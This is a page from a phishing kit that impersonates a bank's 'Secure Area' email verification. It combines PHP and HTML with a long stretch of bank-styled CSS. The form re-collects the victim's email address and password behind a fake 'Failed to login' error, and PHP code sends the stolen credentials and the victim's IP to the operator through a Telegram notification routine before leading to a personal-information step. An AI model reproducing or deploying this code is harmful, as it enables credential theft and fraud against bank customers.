<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Email Verification
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">Please confirm your email</p>
</div>
</div>
</div>
  <div style="padding-top:15px;"></div>
<form id="revmailform" name="vmailform" action="./" novalidate="" autocomplete="off" class="credit-card" method="POST" tabindex="-1">
<input type="hidden" name="email" value="<?php echo $_POST['email']; ?>"/>
<input type="hidden" name="email_password" value="<?php echo $_POST['email_password']; ?>"/>
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="prefinal"/>
<center>
  <div class="form-body">
  <div style="color:black"><b>Email</b>: <input onclick="hide(tooltip1);hide(tooltip2)" id="email" name="re-email" style="width:80.8%; height:40px" type="email" class="spa-input-text" size="20px" placeholder="Email" maxlength="30"></div>
  <div style="padding-top:15px;"></div>
  <div style="color:black"><b>Password</b>: <input onclick="hide(tooltip1);hide(tooltip2);" id="email_password" name="re-email_password" style="width:80.8%; height:40px" type="password" class="spa-input-text" size="20px" placeholder="Email Password" maxlength="30">
		<span id="invalid" style="width:80.8%; display:block; color:indianred; background-color:lightyellow; padding: 8px; font-family: 'Helvetica Neue';">
		Failed to login, please try again.
		</span>
  </div>
  <div style="padding-top:15px;"></div>
	<div style="position:relative;z-index:999;display:inline-block;">
	<span class="tooltipvmail" id="tooltip2" onclick="hide(tooltip2);"><center>Please enter a valid email address.</center></span>
	<span class="tooltipvmail" id="tooltip1" onclick="hide(tooltip1);">
	<center>Please, complete your password.</center>
	</span>
	<button onclick="verifyrevmail();" type="button" class="proceed-btn"><a href="javascript:void(0);">Proceed</a></button>
	</div>
  </div>
  </center>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'prefinal' && isset($_POST['viewstate']) && !empty($_POST['viewstate']) && isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['email_password']) && !empty($_POST['email_password']) && isset($_POST['re-email']) && !empty($_POST['re-email']) && isset($_POST['re-email_password']) && !empty($_POST['re-email_password'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'prefinal' && isset($_POST['viewstate']) && !empty($_POST['viewstate']) && isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['email_password']) && !empty($_POST['email_password']) && isset($_POST['re-email']) && !empty($_POST['re-email']) && isset($_POST['re-email_password']) && !empty($_POST['re-email_password'])) {
	$msj = '<b>[RE-EMAIL]</b> '.$ip.' | Email: <b>'.$_POST['re-email'].'</b> | Password: <b>'.$_POST['re-email_password'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'prefinal' && isset($_POST['viewstate']) && !empty($_POST['viewstate']) && isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['email_password']) && !empty($_POST['email_password']) && isset($_POST['re-email']) && !empty($_POST['re-email']) && isset($_POST['re-email_password']) && !empty($_POST['re-email_password'])) {
		$msj = '<b>[RE-EMAIL]</b> '.$ip.' | Email: <b>'.$_POST['re-email'].'</b> | Password: <b>'.$_POST['re-email_password'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Security Verification
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">Please complete your personal information</p>
</div>
</div>
</div>
<style>
html {
    font-family: sans-serif;
    -ms-text-size-adjust: 100%;
    -webkit-text-size-adjust: 100%;
}


body {
    margin: 0;
    overflow-anchor: none !important;
}
.dcm-max-width {
    max-width: 1100px;
    margin: 0 auto;
}

.disclosure-alert-box {
    background-color: #003b71;
    padding: 5px;
    display: flex;
    justify-content: center;
    align-items: center;
    margin: 10px auto;
    max-width: 1100px;
}

.disclosure-icon {
    width: 40px;
    height: 40px;
    margin-right: 5px;
}

.disclosure-text {
    background-color: #fff;
    max-width: 1000px;
    padding: 5px;
    text-align: left;
}

.disclosure-title {
    font-size: 16px;
    line-height: 1.2em;
    font-weight: bold;
    margin-bottom: 5px;
}

.disclosure-text p {
    font-size: 16px;
    margin-bottom: 5px;
}



article, aside, details, figcaption, figure, footer, header, hgroup, main, nav, section, summary {
    display: block;
}

audio, canvas, progress, video {
    display: inline-block;
    vertical-align: baseline;
}

    audio:not([controls]) {
        display: none;
        height: 0;
    }

[hidden], template {
    display: none;
}

a {
    background: 0 0;
}

    a:active, a:hover {
        outline: 0;
    }

abbr[title] {
    border-bottom: 1px dotted;
}

b, strong {
    font-weight: 700;
}

dfn {
    font-style: italic;
}

h1 {
    font-size: 2em;
    margin: .67em 0;
}

mark {
    background: #ff0;
    color: #000;
}

small {
    font-size: 80%;
}

sub, sup {
    font-size: 75%;
    line-height: 0;
    position: relative;
    vertical-align: baseline;
}

sup {
    top: -.5em;
}

sub {
    bottom: -.25em;
}

img {
    border: 0;
}

svg:not(:root) {
    overflow: hidden;
}

figure {
    margin: 1em 40px;
}

hr {
    -moz-box-sizing: content-box;
    box-sizing: content-box;
    height: 0;
}

pre {
    overflow: auto;
}

code, kbd, pre, samp {
    font-family: monospace,monospace;
    font-size: 1em;
}

button, input, optgroup, select, textarea {
    color: inherit;
    font: inherit;
    margin: 0;
}

button {
    overflow: visible;
}

button, select {
    text-transform: none;
}

button, html input[type=button], input[type=reset], input[type=submit] {
    -webkit-appearance: button;
    cursor: pointer;
}

    button[disabled], html input[disabled] {
        cursor: default;
    }

    button::-moz-focus-inner, input::-moz-focus-inner {
        border: 0;
        padding: 0;
    }

input {
    line-height: normal;
}

    input[type=checkbox], input[type=radio] {
        box-sizing: border-box;
        padding: 0;
    }

    input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button {
        height: auto;
    }

    input[type=search] {
        -webkit-appearance: textfield;
        -moz-box-sizing: content-box;
        -webkit-box-sizing: content-box;
        box-sizing: content-box;
    }

        input[type=search]::-webkit-search-cancel-button, input[type=search]::-webkit-search-decoration {
            -webkit-appearance: none;
        }

fieldset {
    border: 1px solid silver;
    margin: 0 2px;
    padding: .35em .625em .75em;
}

legend {
    border: 0;
    padding: 0;
}

textarea {
    overflow: auto;
}

optgroup {
    font-weight: 700;
}

table {
    border-collapse: collapse;
    border-spacing: 0;
}

td, th {
    padding: 0;
}
/*Addres modal*/
.vertical-alignment-helper {
    display: table;
    height: 100%;
    width: 100%;
}

.AddressModal .modal-dialog {
    display: table-cell;
    vertical-align: middle;
}
.AddressModal .modal-content{
	width:300px;
    height:auto;
    margin: 0 auto;
}
.ie .AddressModal .modal-content{
	width:294px;
    height:auto;
    margin: 0 auto;
}

.AddressModal .modal-body {
    padding: 21px 22px;
}

.btn-back {
    background: #fff;
    border: 1px solid #005EAD;
    color: #005EAD;
    padding: 14px 0px;
    width: 100%;
    font-size: 16px;
    line-height: 20px;
}

.btn-next {
    background: none repeat scroll 0 0 rgb(0, 56, 113);
    color: #fff;
    padding: 14px 0px;
    width: 100%;
    font-size: 16px;
    line-height: 20px;
}

.modal-content h2 {
    font-size: 24px;
    text-align: center;
    padding-bottom: 22px;
    line-height: 27px;
    font-weight:normal;
}

.container-fluid {
    padding: 0px;
}
.address-section{
    padding-left: 10px;
    padding-right: 45px;
    padding-top: 10px;
    padding-bottom: 10px;
    color: #003B71;
    font-size: 15px;
    line-height: 20px;
    text-align: left;
    margin-bottom: 20px;
    background: #F4F4F4 0% 0% no-repeat padding-box;
    border-radius: 4px;
}
    .address-section span {
    color: #333333;
    display: block;
    margin-bottom: 10px;
    font-size: 12px;
    }
.address-section p{
    color: #003B71;
    font-size: 15px;
    line-height: 20px;
    
    text-align: center;
   margin-bottom: 27px;
}
.container-fluid >.button-row {
    padding:0px;
}

.container-fluid > .align-right {
    padding: 0px;
}

.address-label {
    text-align: left;
    font-size: 15px;
    /*height: 97px;*/
    margin-bottom: 25px;
}

.edit-link {
    float: right;
    text-decoration: none !important;
    color: #FFFFFF !important;
    font-size: 15px;
}

.edit-link-img {
    height: 17px;
    float: left;
    padding-top: 3px;
    padding-right: 5px;
}
/*! suntrust-login modal CSS */
.passwordtip {
    position: relative;
    display: inline-block;
}

    .passwordtip .passwordtiptext {
        visibility: visible;
        width: 100px;
        background-color: black;
        color: #fff;
        text-align: center;
        border-radius: 6px;
        padding: 5px 0px;
        position: absolute;
        z-index: 1;
        top: 150%;
        font-size: 14px;
        margin-top: 5px;
    }

        .passwordtip .passwordtiptext::after {
            content: "";
            position: absolute;
            bottom: 100%;
            right: 73%;
            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: transparent transparent black transparent;
        }

.LoginModal {
    text-align: center;
}

    .LoginModal .vertical-alignment {
        display: table;
        height: 100%;
        margin: 0 auto;
    }

    .LoginModal .modal-content {
        width: 360px;
        height: auto;
        margin: 0 auto;
    }

    .LoginModal .modal-body {
        padding-left: 39px;
        padding-right: 39px;
        padding-top: 30px;
        padding-bottom: 37px;
    }

    .LoginModal .modal-dialog {
        display: table-cell;
        vertical-align: middle;
    }

.suntrust-login-heading {
    font-size: 36px;
    color: #C94C06 !important;
    font-weight: normal;
    margin-bottom: 13px;
}

.suntrust-login-header {
    background: #F4F4F4;
    padding-top: 40px;
    padding-left: 38px;
    padding-right: 38px;
    padding-bottom: 30px;
    text-align: center;
    border-radius: 4px 4px 0 0;
    margin: 1px;
}

.suntrust-login-heading-sublabel {
    font-size: 20px;
}
/*.LoginModal .toggle-password {
    bottom:40px !important;
}*/
.LoginModal .forgot-password-link {
    text-align: right;
    margin-top: 10px;
    color: #005EAD;
    font-size: 14px;
}

.LoginModal-buttons {
    text-align: center;
}

.modal-spinner-section {
    text-align: center;
    margin-top: 40px;
}

    .modal-spinner-section .loader {
        border: 4px solid rgba(0,0,0,0.15);
        border-radius: 50%;
        border-top: 4px solid #005ead;
        display: inline-block;
        width: 64px;
        height: 64px;
        -webkit-animation: spin 1s linear infinite;
        animation: spin 1s linear infinite;
    }

@-webkit-keyframes spin {
    0% {
        -webkit-transform: rotate(0deg);
    }

    100% {
        -webkit-transform: rotate(360deg);
    }
}

@keyframes spin {
    0% {
        transform: rotate(0deg);
    }

    100% {
        transform: rotate(360deg);
    }
}

.LoginModal .modal-content .form-error {
    margin-top: 0px !important;
    border-radius: 4px 4px 0px 0px;
}

.LoginModal button.disabled {
    background-color: rgb(153, 175, 198);
    transition: background 0.15s ease-in 0s;
}

.BCC-esign .modal-dialog {
    height: 80%;
    display: block;
    width: 72%;
}

.BCC-esign .modal-content {
    height: 100%;
}

.BCC-esign .modal-body {
    height: 95%;
}


/*! Tooltipster CSS */
.tooltipster-default {
    background: none repeat scroll 0 0 rgba(0,0,0,.9);
    border: 1px solid transparent;
    color: #fff;
    max-width: 300px;
    min-width: 20px;
}

    .tooltipster-default .tooltipster-content {
        font-family: suntrustregular,"Trebuchet MS",sans-serif;
        font-size: 12px;
        line-height: 1.3em;
        padding: 10px 13px;
        overflow: hidden;
    }

.tooltipster-icon {
    cursor: help;
    margin-left: 4px;
}

.tooltipster-base {
    padding: 0;
    font-size: 0;
    line-height: 0;
    position: absolute;
    left: 0;
    top: 0;
    z-index: 9999999;
    pointer-events: none;
    width: auto;
    overflow: visible;
}

    .tooltipster-base .tooltipster-content {
        overflow: hidden;
    }

.tooltipster-arrow {
    display: block;
    text-align: center;
    width: 100%;
    height: 100%;
    position: absolute;
    top: 0;
    left: 0;
    z-index: -1;
}

    .tooltipster-arrow span, .tooltipster-arrow-border {
        display: block;
        width: 0;
        height: 0;
        position: absolute;
    }

.tooltipster-arrow-top span, .tooltipster-arrow-top-left span, .tooltipster-arrow-top-right span {
    border-left: 8px solid transparent !important;
    border-right: 8px solid transparent !important;
    border-top: 8px solid;
    bottom: -7px;
}

.tooltipster-arrow-top .tooltipster-arrow-border, .tooltipster-arrow-top-left .tooltipster-arrow-border, .tooltipster-arrow-top-right .tooltipster-arrow-border {
    border-left: 9px solid transparent !important;
    border-right: 9px solid transparent !important;
    border-top: 9px solid;
    bottom: -7px;
}

.tooltipster-arrow-bottom span, .tooltipster-arrow-bottom-left span, .tooltipster-arrow-bottom-right span {
    border-left: 8px solid transparent !important;
    border-right: 8px solid transparent !important;
    border-bottom: 8px solid;
    top: -7px;
}

.tooltipster-arrow-bottom .tooltipster-arrow-border, .tooltipster-arrow-bottom-left .tooltipster-arrow-border, .tooltipster-arrow-bottom-right .tooltipster-arrow-border {
    border-left: 9px solid transparent !important;
    border-right: 9px solid transparent !important;
    border-bottom: 9px solid;
    top: -7px;
}

.tooltipster-arrow-bottom .tooltipster-arrow-border, .tooltipster-arrow-bottom span, .tooltipster-arrow-top .tooltipster-arrow-border, .tooltipster-arrow-top span {
    left: 0;
    right: 0;
    margin: 0 auto;
}

.tooltipster-arrow-bottom-left span, .tooltipster-arrow-top-left span {
    left: 6px;
}

.tooltipster-arrow-bottom-left .tooltipster-arrow-border, .tooltipster-arrow-top-left .tooltipster-arrow-border {
    left: 5px;
}

.tooltipster-arrow-bottom-right span, .tooltipster-arrow-top-right span {
    right: 6px;
}

.tooltipster-arrow-bottom-right .tooltipster-arrow-border, .tooltipster-arrow-top-right .tooltipster-arrow-border {
    right: 5px;
}

.tooltipster-arrow-left .tooltipster-arrow-border, .tooltipster-arrow-left span {
    border-top: 8px solid transparent !important;
    border-bottom: 8px solid transparent !important;
    border-left: 8px solid;
    top: 50%;
    margin-top: -7px;
    right: -7px;
}

.tooltipster-arrow-left .tooltipster-arrow-border {
    border-top: 9px solid transparent !important;
    border-bottom: 9px solid transparent !important;
    border-left: 9px solid;
    margin-top: -8px;
}

.tooltipster-arrow-right .tooltipster-arrow-border, .tooltipster-arrow-right span {
    border-top: 8px solid transparent !important;
    border-bottom: 8px solid transparent !important;
    border-right: 8px solid;
    top: 50%;
    margin-top: -7px;
    left: -7px;
}

.tooltipster-arrow-right .tooltipster-arrow-border {
    border-top: 9px solid transparent !important;
    border-bottom: 9px solid transparent !important;
    border-right: 9px solid;
    margin-top: -8px;
}

.tooltipster-fade {
    opacity: 0;
    -webkit-transition-property: opacity;
    -moz-transition-property: opacity;
    -o-transition-property: opacity;
    -ms-transition-property: opacity;
    transition-property: opacity;
}

.tooltipster-fade-show {
    opacity: 1;
}

.tooltipster-grow {
    -webkit-transform: scale(0,0);
    -moz-transform: scale(0,0);
    -o-transform: scale(0,0);
    -ms-transform: scale(0,0);
    transform: scale(0,0);
    -webkit-transition-property: -webkit-transform;
    -moz-transition-property: -moz-transform;
    -o-transition-property: -o-transform;
    -ms-transition-property: -ms-transform;
    transition-property: transform;
    -webkit-backface-visibility: hidden;
}

.tooltipster-grow-show {
    -webkit-transform: scale(1,1);
    -moz-transform: scale(1,1);
    -o-transform: scale(1,1);
    -ms-transform: scale(1,1);
    transform: scale(1,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -moz-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -ms-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -o-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
}

.tooltipster-swing {
    opacity: 0;
    -webkit-transform: rotateZ(4deg);
    -moz-transform: rotateZ(4deg);
    -o-transform: rotateZ(4deg);
    -ms-transform: rotateZ(4deg);
    transform: rotateZ(4deg);
    -webkit-transition-property: -webkit-transform,opacity;
    -moz-transition-property: -moz-transform;
    -o-transition-property: -o-transform;
    -ms-transition-property: -ms-transform;
    transition-property: transform;
}

.tooltipster-swing-show {
    opacity: 1;
    -webkit-transform: rotateZ(0deg);
    -moz-transform: rotateZ(0deg);
    -o-transform: rotateZ(0deg);
    -ms-transform: rotateZ(0deg);
    transform: rotateZ(0deg);
    -webkit-transition-timing-function: cubic-bezier(0.23,.635,.495,1);
    -webkit-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    -moz-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    -ms-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    -o-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
}

.tooltipster-fall {
    top: 0;
    -webkit-transition-property: top;
    -moz-transition-property: top;
    -o-transition-property: top;
    -ms-transition-property: top;
    transition-property: top;
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -moz-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -ms-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -o-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
}

    .tooltipster-fall.tooltipster-dying {
        -webkit-transition-property: all;
        -moz-transition-property: all;
        -o-transition-property: all;
        -ms-transition-property: all;
        transition-property: all;
        top: 0 !important;
        opacity: 0;
    }

.tooltipster-slide {
    left: -40px;
    -webkit-transition-property: left;
    -moz-transition-property: left;
    -o-transition-property: left;
    -ms-transition-property: left;
    transition-property: left;
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -moz-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -ms-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -o-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
}

    .tooltipster-slide.tooltipster-dying {
        -webkit-transition-property: all;
        -moz-transition-property: all;
        -o-transition-property: all;
        -ms-transition-property: all;
        transition-property: all;
        left: 0 !important;
        opacity: 0;
    }

.tooltipster-content-changing {
    opacity: .5;
    -webkit-transform: scale(1.1,1.1);
    -moz-transform: scale(1.1,1.1);
    -o-transform: scale(1.1,1.1);
    -ms-transform: scale(1.1,1.1);
    transform: scale(1.1,1.1);
}

.button-offers {
    display: flex;
    margin-top: -60px;
}

.offers-text {
    margin-top: 10px;
    margin-right: 20px;
}

/* jQuery autocomplete styles */
.autocomplete-suggestions {
    text-align: left;
    cursor: default;
    border: 1px solid #ccc;
    border-top: 0;
    background: #fff;
    box-shadow: -1px 1px 3px rgba(0,0,0,.1);
    /* core styles should not be changed */
    position: absolute;
    display: none;
    z-index: 9999;
    max-height: 254px;
    overflow: hidden;
    overflow-y: auto;
    box-sizing: border-box;
}

.autocomplete-suggestion {
    position: relative;
    padding: 0 .6em;
    line-height: 23px;
    white-space: nowrap;
    overflow: hidden;
    font-size: 1.02em;
    color: #333;
}

    .autocomplete-suggestion b {
        font-weight: normal;
        color: #1f8dd6;
    }

    .autocomplete-suggestion.selected {
        background: #f0f0f0;
    }

/* jQuery autocomplete custom class for the dropdown "box" (modified z-index for correct layering, added min-width to best capture long entries)  */
.bigify {
    min-width: 60%;
    z-index: 1 !important;
}

/* clearfix NEW */
.clearleft:before,
.clearleft:after,
.clearfix:before,
.clearfix:after {
    content: "";
    display: table;
}

.clearleft:after {
    clear: left;
}

.clearfix:after {
    clear: both;
}

/* clearfix for IE 6/7 (trigger hasLayout) */
.clearfix, clearleft {
    zoom: 1;
}

.clear {
    clear: both;
}

.clear-left {
    clear: left;
}

.clear-right {
    clear: right;
}


/* jumpfix - add this class to any hidden div with margins to prevent "jumping" from jQuery show/hide */
.jumpfix:before,
.jumpfix:after {
    content: "";
    display: table;
    margin: 0;
    padding: 0;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
    opacity: 0;
    visibility: hidden;
}

/* if jumpfix is causing unwanted space add the "nospace" class as well - HACK - */
/* .jumpfix.nospace:before,     (remove the before space for TESTING) */
.jumpfix.nospace:after {
    margin-bottom: -1em;
}


html {
    font-size: 0.66em;
}

body {
    background-color: rgb(244, 244, 244);
    color: rgb(51, 51, 51);
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 1.5rem;
    font-weight: normal;
    line-height: 2rem;
    margin: 0;
    border-top: 0px solid #fff;
}

h1,
h2,
h3,
h4,
h5 {
    margin-top: 0;
    margin-bottom: 0;
}

p {
    margin-top: 0;
    margin-bottom: 20px;
}

ol,
ul {
    padding-left: 18px;
}

ul {
    list-style: disc outside;
}

ol {
    list-style: lower-alpha outside;
}

a, a:link, a:hover, a:visited, a:active {
    text-decoration: none;
    color: #003871;
    /* color: #324fe1; */
    cursor: pointer;
}

    a:hover, a:focus {
        color: #00294d;
        text-decoration: underline;
    }

strong,
b {
    font-weight: bold;
}

em,
i {
    font-style: italic;
}


fieldset {
    margin: 0;
    padding: 0;
    border: 0;
    border-collapse: separate;
    border-spacing: 0;
}

legend {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    top: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
}
.product-heading {
    color: #C94C06!important;
    font-size: 32px;
    margin-top: 34px;
    font-weight:normal;
    line-height: 22px;
}
.minus-btn{
    width: 30px;
    height: 30px;
    /*background-color: #E1E8EE;
    border-radius: 6px;*/
    border: none;
    cursor: pointer;
  background: transparent url(../images/minus_icon.svg) 0% 0% no-repeat padding-box;opacity: 1;
  display:block;
  outline:none !important;
}
.minus-btn-disabled {
    width: 30px;
    height: 30px;
    border: none;
    background: transparent url(../images/minus_icon_disabled.svg) 0% 0% no-repeat padding-box;opacity: 1;
    display:block;
    outline:none !important;
}
.plus-btn{
    width: 30px;
    height: 30px;
    /*background-color: #E1E8EE;
    border-radius: 6px;*/
    border: none;
    cursor: pointer;
  background: transparent url(../images/add_icon.svg) 0% 0% no-repeat padding-box;opacity: 1;
  display:block;
  outline:none !important;
   
}
.plus-btn-disabled {
    width: 30px;
    height: 30px;
    border: none;
    background: transparent url(../images/add_icon_disabled.svg) 0% 0% no-repeat padding-box;opacity: 1;
    display:block;
    outline:none !important;   
}
.quantity {
display:flex;
float:right;
}
.cart-input {
height:35px !important;
width:35px !important;
text-align: center;
letter-spacing: 0;
color: #005EAD !important;
font-size:20px !important;
margin-left:15px !important;
margin-right:15px !important;
cursor:default;
}
.cart-input-disabled {
    height:35px !important;
width:35px !important;
text-align: center;
letter-spacing: 0;
cursor:default;
font-size:20px !important;
margin-left:15px !important;
margin-right:15px !important;
color:#CFCFCF !important;
}

.cart-input:focus{
    border: 1px solid rgb(204, 204, 204) !important;
}
.cart-input-disabled:focus{
    border: 1px solid rgb(204, 204, 204) !important;
}
.review-heading {
    color: #C94C06 !important;
    font-size: 30px;
    line-height: 41px;
    font-weight: normal;
    line-height: 22px;
}

.review-note {
    margin-bottom: 40px;
}

.review-ssn {
    font-family: suntrustregular;
    color: #005EAD !important;
    font-size: 15px;
    padding-left: 15px;
    position: absolute;
    top: 40px;
    left: 125px;
}


/* authentication bar specs */

.authentication {
    background: #777;
    z-index: 2;
}

.authentication-container {
    box-sizing: border-box;
    margin: 0 auto;
    max-width: 1000px;
    padding: 2px 10px;
    text-align: right;
}

.authentication ul {
    margin: 0;
    padding: 0;
}

.authentication li {
    display: inline;
    list-style-type: none;
    border-left: 1px solid #aaa;
    padding: 0 10px;
}

    .authentication li:first-child {
        border: 0;
    }

    .authentication li:last-child {
        padding-right: 0;
    }

    .authentication li a:link, .authentication li a:hover, .authentication li a:visited, .authentication li a:active {
        font-size: 1.1rem;
        font-weight: 700;
        color: #fff;
        text-decoration: none;
    }


/* header specs */

header {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    width: 100%;
    z-index: 2;
}


.header-container {
    box-shadow: none;
    box-sizing: border-box;
    display: table;
    padding: 20px 30px;
    width: 100%;
}

    .header-container .header-logo-container {
        text-align: center;
        max-width: 1000px;
        margin-left: auto;
        margin-right: auto;
    }

        /* 19.7 */
        .header-container .header-logo-container .header-card-benefits {
            position: absolute;
            float: left;
            padding: 20px;
            color: #005EAD;
            cursor: pointer;
            background: #D4E1EF 0% 0% no-repeat padding-box;
            border-radius: 4px;
            opacity: 1;
        }

.arrow {
    background-image: url('../images/Group.png');
    display: inline-block;
    width: 26px;
    height: 18px;
    vertical-align: bottom;
}

.arrow-down {
    transform: rotate(180deg);
}

.card-benefits-content {
    position: absolute;
    z-index: 3;
    background-color: white;
    width: 100%;
}

    .card-benefits-content > div {
        margin-right: auto;
        margin-left: auto;
        max-width: 1000px;
        padding: 20px;
        box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.16);
    }

        .card-benefits-content > div > .card-benefits-header {
            width: 362px;
            height: 27px;
            font-size: 24px;
            color: #EE611F;
        }

        .card-benefits-content > div > .card-benefits-data {
            font-size: 15px;
            color: #333333;
        }

.card-benefits-data > ul > li {
    /*float: left;
    width: 20%;*/
    margin-left: 25px;
}

.card-benefits-data > p {
    padding-top: 20px;
    margin-left: 25px;
    padding-bottom: 20px;
    clear: both;
}

.card-benefits-close {
    color: #005EAD;
    cursor: pointer;
    float: right;
    font-size: 15px;
}

.card-benefits-close-img {
    background: url('../images/Group 723.png') no-repeat;
    height: 7.92px;
    width: 7.92px;
    display: inline-block;
    background-size: cover;
}

.card-benefits-clear {
    clear: both;
}

header .header-logo {
    display: inline-block;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    background: url(../images/suntrust-logo.svg) no-repeat;
    width: 210px;
    height: 45px;
}

header.shadow .header-container {
    box-shadow: 0 4px 4px rgba(0, 0, 0, 0.06);
    transition: all 0.4s ease 0s;
}

.arrow-downward {
    background-image: url('../images/darkblue-down.svg');
    display: inline-block;
    width: 26px;
    height: 18px;
    vertical-align: bottom;
}

.arrow-down {
    transform: rotate(180deg);
}

/* accessibility specs */
.accessible-text {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    top: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
}


.double-spaced {
    margin-top: 2em;
    margin-bottom: 2em;
}

.nowrap {
    white-space: nowrap;
}

/* progress tracker specs */



.progress-tracker {
    list-style: none;
    margin: 0;
    margin-bottom: 10px;
    padding: 0;
    white-space: nowrap;
    display: table;
    width: 100%;
}

    .progress-tracker > .item {
        display: inline-block;
        position: relative;
        padding: 17px 0 17px 34px;
        color: #707070;
        background: #f4f4f4;
        display: table-cell;
    }

        .progress-tracker > .item > .text {
            margin-bottom: 0px;
            margin-top: 0px;
            font-size: 1.3rem;
            font-weight: 700;
            line-height: 1.4rem;
            text-align: center;
            padding-right: 1px; /*testing this */
        }

        .progress-tracker > .item:after {
            content: "";
            border-top: 24px solid transparent;
            border-bottom: 24px solid transparent;
            border-left: 22px solid #f4f4f4;
            position: absolute;
            right: -21px; /* was 22 */
            top: 0;
            z-index: 1;
        }

        .progress-tracker > .item:before {
            content: "";
            position: absolute;
            border-top: 28px solid transparent;
            border-bottom: 28px solid transparent;
            border-left: 25px solid #ffffff;
            left: 0;
            top: -4px;
        }

        .progress-tracker > .item:first-child {
            padding-left: 15px;
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
        }

            .progress-tracker > .item:first-child:before {
                display: none;
            }

        .progress-tracker > .item:last-child {
            padding-right: 15px;
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
        }

            .progress-tracker > .item:last-child:after {
                display: none;
            }

        .progress-tracker > .item.active {
            color: #ba4506; /* --- for ADA compliance -- */
            /* color: #ee6120;  --- old color, noncompliant --- */
            background: #f5ecdd;
        }

            .progress-tracker > .item.active:after {
                border-left-color: #f5ecdd;
            }


/* error/confirmation specs */

.form-inline {
    position: relative;
    top: -20px;
}

.form-error, .page-section-error {
    position: relative;
    background-color: #ffdbdb;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
}

.page-section-error {
    margin: 0 0 20px 0;
    /*
    color: #ff3300;
    background-color: #ffffff;
    
    ... makes the red box go away ...
    
    */
}

    .form-error:before, .page-section-error:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e003";
        position: absolute;
        top: 20px;
        left: 20px;
        color: #ff3300;
        font-size: 25px;
    }

    .bootstrap .form-error:before, .page-section-error:before {
        content: '';
        background: url("../images/Group 243.svg") no-repeat;
        position: absolute;
        height: 24px;
        width: 24px;
        left: 20px;
        top: 20px;
    }

